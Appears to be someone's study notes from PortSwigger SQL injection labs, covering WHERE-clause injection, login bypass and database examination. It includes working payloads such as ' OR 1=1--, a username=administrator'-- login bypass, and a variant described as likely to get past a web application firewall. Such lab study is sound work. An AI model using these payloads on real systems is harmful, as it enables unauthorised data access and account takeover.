Basic Methods:
    Retrieving hidden data - where you can modify an SQL query to return additional results.
    Subverting application logic - where you can change a query to interfere with the application's logic.
    UNION attacks- where you can retrieve data from different database tables.
    Examining the database - where you can extract information about the version and structure of the database.
    Blind SQL injection -  where the results of a query you control are not returned in the application's responses.
Commands in SQL:

1. Where clause in http get method. 
2. Bypass login username, password doesn't matter. Where clause again.
3. Examining the database
4. Blind SQL injection vulnerabilities
5. SQL injection with filter bypass via XML encoding





1. Where clause in http get method. 
https://insecure-website.com/products?category=Gifts Real web page
https://insecure-website.com/products?category=Gifts'--   Injection, Single quote gives Gifts inned 'Gifts' as app tacks on '' outer. 
SELECT * FROM products WHERE category = 'Gifts' AND released = 1;   Real query
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1;  What our '-- did
You need to get all categories released and unlreleased:
' or category = 'Pets' or category = 'Lifestyle' or category = 'Accessories'--
filter?category=Clothing%2c+shoes+and+accessories' or category = 'Pets' or category = 'Lifestyle' or category = 'Accessories'--
Above code worked but only because corporate firewall was blocking the real solution: ' or 1=1 --

https://insecure-website.com/products?category=Gifts'+OR+1=1--
You can do this one from the GUI but it says to use intercept and modify from BURP. I thought BURP requirement was why I was failing. It doesn't care about client side
it was a firewall. 

Solutions:
'+OR+1=1--   WAF would block
filter?category=Clothing%2c+shoes+and+accessories' or category = 'Pets' or category = 'Lifestyle' or category = 'Accessories'--    WAF likely no block

csrf=WdhkXnM3RCCBUnPOw4jLxb1qGaAT4mZn&username=administrator%27--&password=1111111
' to hex is 27
Learned intercept to hack from there and the GUI

3. Examining the database
https://portswigger.net/web-security/sql-injection/examining-the-database
Oracle:
SELECT * FROM v$version
SELECT * FROM information_schema.tables; schema is just tabled and column info no data just the meta.

4. Blind SQL injection vulnerabilities
https://portswigger.net/web-security/sql-injection/blind
This means that the application does not return the results of the SQL query or the details of any database errors within its responses.

5.
Put in math and parameters within XML to see if it works.
Put in a union to see if it blocks or not or what happends.
